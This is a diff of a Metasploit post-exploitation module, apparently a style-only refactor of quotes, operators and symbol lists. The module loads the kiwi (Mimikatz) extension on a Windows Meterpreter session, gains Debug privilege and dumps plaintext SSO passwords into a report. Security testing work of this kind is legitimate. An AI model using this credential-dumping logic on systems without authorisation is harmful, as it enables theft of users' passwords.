@@ -36,41 +36,41 @@ class MetasploitModule < Msf::Post
 
   def run
     if sysinfo.nil?
-      print_error("This module is only available in a windows meterpreter session.")
+      print_error('This module is only available in a windows meterpreter session.')
       return
     end
 
     print_status("Running module against #{sysinfo['Computer']}")
 
-    if session.arch == ARCH_X86 and sysinfo['Architecture'] == ARCH_X64
-      print_error("x64 platform requires x64 meterpreter and kiwi extension")
+    if (session.arch == ARCH_X86) && (sysinfo['Architecture'] == ARCH_X64)
+      print_error('x64 platform requires x64 meterpreter and kiwi extension')
       return
     end
 
     unless client.kiwi
-      vprint_status("Loading kiwi extension...")
+      vprint_status('Loading kiwi extension...')
       begin
-        client.core.use("kiwi")
+        client.core.use('kiwi')
       rescue Errno::ENOENT
-        print_error("This module is only available in a windows meterpreter session.")
+        print_error('This module is only available in a windows meterpreter session.')
         return
       end
     end
 
     unless is_system?
-      vprint_warning("Not running as SYSTEM")
+      vprint_warning('Not running as SYSTEM')
       unless client.kiwi.get_debug_privilege
-        print_error("Unable to get Debug privilege")
+        print_error('Unable to get Debug privilege')
         return
       end
-      vprint_status("Retrieved Debug privilege")
+      vprint_status('Retrieved Debug privilege')
     end
 
-    vprint_status("Retrieving Credentials")
+    vprint_status('Retrieving Credentials')
     res = client.kiwi.creds_all
 
     table = Rex::Text::Table.new(
-      'Header' => "Windows SSO Credentials",
+      'Header' => 'Windows SSO Credentials',
       'Indent' => 0,
       'SortIndex' => 0,
       'Columns' => ['Package', 'Domain', 'User', 'Password']
@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Post
 
     processed = Set.new
     livessp_found = false
-    [:tspkg, :kerberos, :ssp, :livessp].each do |package|
+    %i[tspkg kerberos ssp livessp].each do |package|
       next unless res[package]
 
       res[package].each do |r|
@@ -86,7 +86,7 @@ class MetasploitModule < Msf::Post
         next if r['Username'] == '(null)' && r['Password'] == '(null)'
 
         row = [r['Domain'], r['Username'], r['Password']]
-        id = row.join(":")
+        id = row.join(':')
         unless processed.include?(id)
           table << [package.to_s] + row
           report_creds(*row)
@@ -101,13 +101,13 @@ class MetasploitModule < Msf::Post
   end
 
   def report_creds(domain, user, pass)
-    return if (user.empty? or pass.empty?)
-    return if pass.include?("n.a.")
+    return if (user.empty? || pass.empty?)
+    return if pass.include?('n.a.')
 
     # Assemble data about the credential objects we will be creating
     credential_data = {
       origin_type: :session,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       private_data: pass,
       private_type: :password,
       session_id: session_db_id,
